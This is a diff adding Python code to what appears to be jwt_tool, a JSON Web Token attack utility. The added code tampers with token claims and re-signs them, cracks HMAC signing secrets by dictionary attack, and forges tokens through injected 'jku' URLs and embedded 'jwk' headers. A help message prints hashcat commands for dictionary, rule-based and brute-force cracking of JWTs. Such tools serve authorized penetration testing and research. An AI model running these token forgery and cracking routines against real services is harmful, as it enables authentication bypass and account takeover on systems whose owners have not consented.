@@ -497,4 +497,504 @@ def tamperToken(paylDict, headDict, sig):
         elif selection == 0:
             break
         else:
+          exit(1)
+    if config['argvals']['sigType'] == "" and config['argvals']['exploitType'] == "":
+        cprintc("Signature unchanged - no signing method specified (-S or -X)", "cyan")
+        newContents = genContents(headDict, paylDict)
+        desc = "Tampered token:"
+        jwtOut(newContents+"."+sig, "Manual Tamper - original signature", desc)
+    elif config['argvals']['exploitType'] != "":
+        runExploits()
+    elif config['argvals']['sigType'] != "":
+        signingToken(headDict, paylDict)
+
+def signingToken(newheadDict, newpaylDict):
+    if config['argvals']['sigType'][0:2] == "hs":
+        key = ""
+        if args.password:
+            key = config['argvals']['key']
+        elif args.keyfile:
+            key = open(config['argvals']['keyFile']).read()
+        newSig, newContents = signTokenHS(newheadDict, newpaylDict, key, int(config['argvals']['sigType'][2:]))
+        desc = "Tampered token - HMAC Signing:"
+        jwtOut(newContents+"."+newSig, "Manual Tamper - HMAC Signing", desc)
+    elif config['argvals']['sigType'][0:2] == "rs":
+        newSig, newContents = signTokenRSA(newheadDict, newpaylDict, config['crypto']['privkey'], int(config['argvals']['sigType'][2:]))
+        desc = "Tampered token - RSA Signing:"
+        jwtOut(newContents+"."+newSig, "Manual Tamper - RSA Signing", desc)
+    elif config['argvals']['sigType'][0:2] == "es":
+        newSig, newContents = signTokenEC(newheadDict, newpaylDict, config['crypto']['ecprivkey'], int(config['argvals']['sigType'][2:]))
+        desc = "Tampered token - EC Signing:"
+        jwtOut(newContents+"."+newSig, "Manual Tamper - EC Signing", desc)
+    elif config['argvals']['sigType'][0:2] == "ps":
+        newSig, newContents = signTokenPSS(newheadDict, newpaylDict, config['crypto']['privkey'], int(config['argvals']['sigType'][2:]))
+        desc = "Tampered token - PSS RSA Signing:"
+        jwtOut(newContents+"."+newSig, "Manual Tamper - PSS RSA Signing", desc)
+
+def checkSig(sig, contents, key):
+    quiet = False
+    if key == "":
+        cprintc("Type in the key to test", "white")
+        key = input("> ")
+    testKey(key.encode(), sig, contents, headDict, quiet)
+
+def checkSigKid(sig, contents):
+    quiet = False
+    cprintc("\nLoading key file...", "cyan")
+    try:
+        key1 = open(config['argvals']['keyFile']).read()
+        cprintc("File loaded: "+config['argvals']['keyFile'], "cyan")
+        testKey(key1.encode(), sig, contents, headDict, quiet)
+    except:
+        cprintc("Could not load key file", "red")
+        exit(1)
+
+def crackSig(sig, contents):
+    quiet = True
+    if headDict["alg"][0:2] != "HS":
+        cprintc("Algorithm is not HMAC-SHA - cannot test against passwords, try the Verify function.", "red")
+        return
+    # print("\nLoading key dictionary...")
+    try:
+        # cprintc("File loaded: "+config['argvals']['keyList'], "cyan")
+        keyLst = open(config['argvals']['keyList'], "r", encoding='utf-8', errors='ignore')
+        nextKey = keyLst.readline()
+    except:
+        cprintc("No dictionary file loaded", "red")
+        exit(1)
+    # print("Testing passwords in dictionary...")
+    utf8errors = 0
+    wordcount = 0
+    while nextKey:
+        wordcount += 1
+        try:
+            cracked = testKey(nextKey.strip().encode('UTF-8'), sig, contents, headDict, quiet)
+        except:
+            cracked = False
+        if not cracked:
+            if wordcount % 1000000 == 0:
+                cprintc("[*] Tested "+str(int(wordcount/1000000))+" million passwords so far", "cyan")
+            try:
+                nextKey = keyLst.readline()
+            except:
+                utf8errors  += 1
+                nextKey = keyLst.readline()
+        else:
+            return
+    if cracked == False:
+        cprintc("[-] Key not in dictionary", "red")
+        if not args.mode:
+            cprintc("\n===============================\nAs your list wasn't able to crack this token you might be better off using longer dictionaries, custom dictionaries, mangling rules, or brute force attacks.\nhashcat (https://hashcat.net/hashcat/) is ideal for this as it is highly optimised for speed. Just add your JWT to a text file, then use the following syntax to give you a good start:\n\n[*] dictionary attacks: hashcat -a 0 -m 16500 jwt.txt passlist.txt\n[*] rule-based attack:  hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule\n[*] brute-force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6\n===============================\n", "cyan")
+    if utf8errors > 0:
+        cprintc(utf8errors, " UTF-8 incompatible passwords skipped", "cyan")
+
+def castInput(newInput):
+    if "{" in str(newInput):
+        try:
+            jsonInput = json.loads(newInput)
+            return jsonInput
+        except ValueError:
+            pass
+    if "\"" in str(newInput):
+        return newInput.strip("\"")
+    elif newInput == "True" or newInput == "true":
+        return True
+    elif newInput == "False" or newInput == "false":
+        return False
+    elif newInput == "null":
+        return None
+    else:
+        try:
+            numInput = float(newInput)
+            try:
+                intInput = int(newInput)
+                return intInput
+            except:
+                return numInput
+        except:
+            return str(newInput)
+    return newInput
+
+def buildSubclaim(newVal, claimList, selection):
+    while True:
+        subList = [0]
+        s = 0
+        for subclaim in newVal:
+            subNum = s+1
+            cprintc("["+str(subNum)+"] "+subclaim+" = "+str(newVal[subclaim]), "white")
+            s += 1
+            subList.append(subclaim)
+        cprintc("["+str(s+1)+"] *ADD A VALUE*", "white")
+        cprintc("["+str(s+2)+"] *DELETE A VALUE*", "white")
+        cprintc("[0] Continue to next step", "white")
+        try:
+            subSel = int(input("> "))
+        except:
+            cprintc("Invalid selection", "red")
             exit(1)
+        if subSel<=len(newVal) and subSel>0:
+            selClaim = subList[subSel]
+            cprintc("\nCurrent value of "+selClaim+" is: "+str(newVal[selClaim]), "white")
+            cprintc("Please enter new value and hit ENTER", "white")
+            newVal[selClaim] = castInput(input("> "))
+            cprintc("", "white")
+        elif subSel == s+1:
+            cprintc("Please enter new Key and hit ENTER", "white")
+            newPair = input("> ")
+            cprintc("Please enter new value for "+newPair+" and hit ENTER", "white")
+            newVal[newPair] = castInput(input("> "))
+        elif subSel == s+2:
+            cprintc("Please select a Key to DELETE and hit ENTER", "white")
+            s = 0
+            for subclaim in newVal:
+                subNum = s+1
+                cprintc("["+str(subNum)+"] "+subclaim+" = "+str(newVal[subclaim]), "white")
+                subList.append(subclaim)
+                s += 1
+            try:
+                selSub = int(input("> "))
+            except:
+                cprintc("Invalid selection", "red")
+                exit(1)
+            delSub = subList[selSub]
+            del newVal[delSub]
+        elif subSel == 0:
+            return newVal
+
+def testKey(key, sig, contents, headDict, quiet):
+    if headDict["alg"] == "HS256":
+        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha256).digest()).decode('UTF-8').strip("=")
+    elif headDict["alg"] == "HS384":
+        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha384).digest()).decode('UTF-8').strip("=")
+    elif headDict["alg"] == "HS512":
+        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha512).digest()).decode('UTF-8').strip("=")
+    else:
+        cprintc("Algorithm is not HMAC-SHA - cannot test with this tool.", "red")
+        exit(1)
+    if testSig == sig:
+        cracked = True
+        if len(key) > 25:
+            cprintc("[+] CORRECT key found:\n"+key.decode('UTF-8'), "green")
+        else:
+            cprintc("[+] "+key.decode('UTF-8')+" is the CORRECT key!", "green")
+        cprintc("You can tamper/fuzz the token contents (-T/-I) and sign it using:\npython3 jwt_tool.py [options here] -S "+str(headDict["alg"]).lower()+" -p \""+key.decode('UTF-8')+"\"", "cyan")
+        return cracked
+    else:
+        cracked = False
+        if quiet == False:
+            if len(key) > 25:
+                cprintc("[-] "+key[0:25].decode('UTF-8')+"...(output trimmed) is not the correct key", "red")
+            else:
+                cprintc("[-] "+key.decode('UTF-8')+" is not the correct key", "red")
+        return cracked
+
+def getRSAKeyPair():
+    #config['crypto']['pubkey'] = config['crypto']['pubkey']
+    privkey = config['crypto']['privkey']
+    cprintc("key: "+privkey, "cyan")
+    privKey = RSA.importKey(open(privkey).read())
+    pubKey = privKey.publickey().exportKey("PEM")
+    #config['crypto']['pubkey'] = RSA.importKey(config['crypto']['pubkey'])
+    return pubKey, privKey
+
+def newRSAKeyPair():
+    new_key = RSA.generate(2048, e=65537)
+    pubKey = new_key.publickey().exportKey("PEM")
+    privKey = new_key.exportKey("PEM")
+    return pubKey, privKey
+
+def newECKeyPair():
+    new_key = ECC.generate(curve='P-256')
+    pubkey = new_key.public_key().export_key(format="PEM")
+    privKey = new_key.export_key(format="PEM")
+    return pubkey, privKey
+
+def signTokenHS(headDict, paylDict, key, hashLength):
+    newHead = headDict
+    newHead["alg"] = "HS"+str(hashLength)
+    if hashLength == 384:
+        newContents = genContents(newHead, paylDict)
+        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha384).digest()).decode('UTF-8').strip("=")
+    elif hashLength == 512:
+        newContents = genContents(newHead, paylDict)
+        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha512).digest()).decode('UTF-8').strip("=")
+    else:
+        newContents = genContents(newHead, paylDict)
+        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
+    return newSig, newContents
+
+def buildJWKS(n, e, kid):
+    newjwks = {}
+    newjwks["kty"] = "RSA"
+    newjwks["kid"] = kid
+    newjwks["use"] = "sig"
+    newjwks["e"] = str(e.decode('UTF-8'))
+    newjwks["n"] = str(n.decode('UTF-8').rstrip("="))
+    return newjwks
+
+def jwksGen(headDict, paylDict, jku, privKey, kid="jwt_tool"):
+    newHead = headDict
+    nowtime = str(int(datetime.now().timestamp()))
+    key = RSA.importKey(open(config['crypto']['privkey']).read())
+    pubKey = key.publickey().exportKey("PEM")
+    privKey = key.export_key(format="PEM")
+    new_key = RSA.importKey(pubKey)
+    n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
+    e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
+    privKeyName = config['crypto']['privkey']
+    newjwks = buildJWKS(n, e, kid)
+    newHead["jku"] = jku
+    newHead["alg"] = "RS256"
+    key = RSA.importKey(privKey)
+    newContents = genContents(newHead, paylDict)
+    newContents = newContents.encode('UTF-8')
+    h = SHA256.new(newContents)
+    signer = PKCS1_v1_5.new(key)
+    try:
+        signature = signer.sign(h)
+    except:
+        cprintc("Invalid Private Key", "red")
+        exit(1)
+    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
+    jwksout = json.dumps(newjwks,separators=(",",":"), indent=4)
+    jwksbuild = {"keys": []}
+    jwksbuild["keys"].append(newjwks)
+    fulljwks = json.dumps(jwksbuild,separators=(",",":"), indent=4)
+    if config['crypto']['jwks'] == "":
+        jwksName = "jwks_jwttool_RSA_"+nowtime+".json"
+        with open(jwksName, 'w') as test_jwks_out:
+                test_jwks_out.write(fulljwks)
+    else:
+        jwksName = config['crypto']['jwks']
+    return newSig, newContents.decode('UTF-8'), jwksout, privKeyName, jwksName, fulljwks
+
+def jwksEmbed(newheadDict, newpaylDict):
+    newHead = newheadDict
+    pubKey, privKey = getRSAKeyPair()
+    new_key = RSA.importKey(pubKey)
+    n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
+    e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
+    newjwks = buildJWKS(n, e, config['customising']['jwks_kid'])
+    newHead["jwk"] = newjwks
+    newHead["alg"] = "RS256"
+    key = privKey
+    # key = RSA.importKey(privKey)
+    newContents = genContents(newHead, newpaylDict)
+    newContents = newContents.encode('UTF-8')
+    h = SHA256.new(newContents)
+    signer = PKCS1_v1_5.new(key)
+    try:
+        signature = signer.sign(h)
+    except:
+        cprintc("Invalid Private Key", "red")
+        exit(1)
+    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
+    return newSig, newContents.decode('UTF-8')
+
+def signTokenRSA(headDict, paylDict, privKey, hashLength):
+    newHead = headDict
+    newHead["alg"] = "RS"+str(hashLength)
+    key = RSA.importKey(open(config['crypto']['privkey']).read())
+    newContents = genContents(newHead, paylDict)
+    newContents = newContents.encode('UTF-8')
+    if hashLength == 256:
+        h = SHA256.new(newContents)
+    elif hashLength == 384:
+        h = SHA384.new(newContents)
+    elif hashLength == 512:
+        h = SHA512.new(newContents)
+    else:
+        cprintc("Invalid RSA hash length", "red")
+        exit(1)
+    signer = PKCS1_v1_5.new(key)
+    try:
+        signature = signer.sign(h)
+    except:
+        cprintc("Invalid Private Key", "red")
+        exit(1)
+    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
+    return newSig, newContents.decode('UTF-8')
+
+def signTokenEC(headDict, paylDict, privKey, hashLength):
+    newHead = headDict
+    newHead["alg"] = "ES"+str(hashLength)
+    key = ECC.import_key(open(config['crypto']['ecprivkey']).read())
+    newContents = genContents(newHead, paylDict)
+    newContents = newContents.encode('UTF-8')
+    if hashLength == 256:
+        h = SHA256.new(newContents)
+    elif hashLength == 384:
+        h = SHA384.new(newContents)
+    elif hashLength == 512:
+        h = SHA512.new(newContents)
+    else:
+        cprintc("Invalid hash length", "red")
+        exit(1)
+    signer = DSS.new(key, 'fips-186-3')
+    try:
+        signature = signer.sign(h)
+    except:
+        cprintc("Invalid Private Key", "red")
+        exit(1)
+    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
+    return newSig, newContents.decode('UTF-8')
+
+def signTokenPSS(headDict, paylDict, privKey, hashLength):
+    newHead = headDict
+    newHead["alg"] = "PS"+str(hashLength)
+    key = RSA.importKey(open(config['crypto']['privkey']).read())
+    newContents = genContents(newHead, paylDict)
+    newContents = newContents.encode('UTF-8')
+    if hashLength == 256:
+        h = SHA256.new(newContents)
+    elif hashLength == 384:
+        h = SHA384.new(newContents)
+    elif hashLength == 512:
+        h = SHA512.new(newContents)
+    else:
+        cprintc("Invalid RSA hash length", "red")
+        exit(1)
+    try:
+        signature = pss.new(key).sign(h)
+    except:
+        cprintc("Invalid Private Key", "red")
+        exit(1)
+    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
+    return newSig, newContents.decode('UTF-8')
+
+def verifyTokenRSA(headDict, paylDict, sig, pubKey):
+    key = RSA.importKey(open(pubKey).read())
+    newContents = genContents(headDict, paylDict)
+    newContents = newContents.encode('UTF-8')
+    if "-" in sig:
+        try:
+            sig = base64.urlsafe_b64decode(sig)
+        except:
+            pass
+        try:
+            sig = base64.urlsafe_b64decode(sig+"=")
+        except:
+            pass
+        try:
+            sig = base64.urlsafe_b64decode(sig+"==")
+        except:
+            pass
+    elif "+" in sig:
+        try:
+            sig = base64.b64decode(sig)
+        except:
+            pass
+        try:
+            sig = base64.b64decode(sig+"=")
+        except:
+            pass
+        try:
+            sig = base64.b64decode(sig+"==")
+        except:
+            pass
+    else:
+        cprintc("Signature not Base64 encoded HEX", "red")
+    if headDict['alg'] == "RS256":
+        h = SHA256.new(newContents)
+    elif headDict['alg'] == "RS384":
+        h = SHA384.new(newContents)
+    elif headDict['alg'] == "RS512":
+        h = SHA512.new(newContents)
+    else:
+        cprintc("Invalid RSA algorithm", "red")
+    verifier = PKCS1_v1_5.new(key)
+    try:
+        valid = verifier.verify(h, sig)
+        if valid:
+            cprintc("RSA Signature is VALID", "green")
+            valid = True
+        else:
+            cprintc("RSA Signature is INVALID", "red")
+            valid = False
+    except:
+        cprintc("The Public Key is invalid", "red")
+    return valid
+
+def verifyTokenEC(headDict, paylDict, sig, pubKey):
+    newContents = genContents(headDict, paylDict)
+    message = newContents.encode('UTF-8')
+    if "-" in str(sig):
+        try:
+            signature = base64.urlsafe_b64decode(sig)
+        except:
+            pass
+        try:
+            signature = base64.urlsafe_b64decode(sig+"=")
+        except:
+            pass
+        try:
+            signature = base64.urlsafe_b64decode(sig+"==")
+        except:
+            pass
+    elif "+" in str(sig):
+        try:
+            signature = base64.b64decode(sig)
+        except:
+            pass
+        try:
+            signature = base64.b64decode(sig+"=")
+        except:
+            pass
+        try:
+            signature = base64.b64decode(sig+"==")
+        except:
+            pass
+    else:
+        cprintc("Signature not Base64 encoded HEX", "red")
+    if headDict['alg'] == "ES256":
+        h = SHA256.new(message)
+    elif headDict['alg'] == "ES384":
+        h = SHA384.new(message)
+    elif headDict['alg'] == "ES512":
+        h = SHA512.new(message)
+    else:
+        cprintc("Invalid ECDSA algorithm", "red")
+    pubkey = open(pubKey, "r")
+    pub_key = ECC.import_key(pubkey.read())
+    verifier = DSS.new(pub_key, 'fips-186-3')
+    try:
+        verifier.verify(h, signature)
+        cprintc("ECC Signature is VALID", "green")
+        valid = True
+    except:
+        cprintc("ECC Signature is INVALID", "red")
+        valid = False
+    return valid
+
+def verifyTokenPSS(headDict, paylDict, sig, pubKey):
+    key = RSA.importKey(open(pubKey).read())
+    newContents = genContents(headDict, paylDict)
+    newContents = newContents.encode('UTF-8')
+    if "-" in sig:
+        try:
+            sig = base64.urlsafe_b64decode(sig)
+        except:
+            pass
+        try:
+            sig = base64.urlsafe_b64decode(sig+"=")
+        except:
+            pass
+        try:
+            sig = base64.urlsafe_b64decode(sig+"==")
+        except:
+            pass
+    elif "+" in sig:
+        try:
+            sig = base64.b64decode(sig)
+        except:
+            pass
+        try:
+            sig = base64.b64decode(sig+"=")
+        except:
+            pass
+        try:
+            sig = base64.b64decode(sig+"==")
+        except:
+            pass
+    else:
+        cprintc("Signature not Base64 encoded HEX", "red")
